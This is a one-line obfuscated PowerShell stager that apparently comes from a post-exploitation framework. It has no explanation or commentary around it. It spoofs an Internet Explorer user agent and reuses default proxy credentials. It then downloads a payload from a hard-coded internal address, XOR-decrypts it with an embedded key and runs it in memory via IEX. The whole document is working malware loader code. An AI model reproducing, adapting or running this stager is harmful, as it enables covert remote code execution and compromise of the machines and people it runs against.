
[SySTeM.NEt.SERvicePoiNTManager]::EXpEcT100ConTiNUE = 0;$Wc=NeW-ObJEcT SystEm.NEt.WebClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadERs.ADD('User-Agent',$u);$wC.PrOxY = [SYsTem.Net.WEbReQuest]::DEFAultWeBPRoXy;$WC.PROXY.CREDentIAlS = [SysTEm.NeT.CrEDentiAlCaCHE]::DeFAuLTNetWOrkCReDeNtIALs;$K='347602146a923872538f3803eb5f3cef';$i=0;[cHar[]]$B=([ChAR[]]($Wc.DowNLOADStRiNG("http://192.168.1.11:8080/index.asp")))|%{$_-BXoR$K[$I++%$k.LeNgTH]};IEX ($B-JoIN'')

